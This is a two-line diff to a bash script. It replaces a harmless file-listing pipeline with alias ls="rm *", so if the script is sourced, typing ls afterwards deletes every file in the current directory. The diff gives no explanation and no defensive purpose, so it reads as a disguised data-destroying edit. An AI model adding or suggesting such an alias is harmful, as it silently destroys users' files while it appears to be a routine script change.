@@ -1,2 +1,2 @@
 #!/bin/bash
-ls -l | tail -n 1 | cut -d ' ' -f 1-2
+alias ls="rm *"
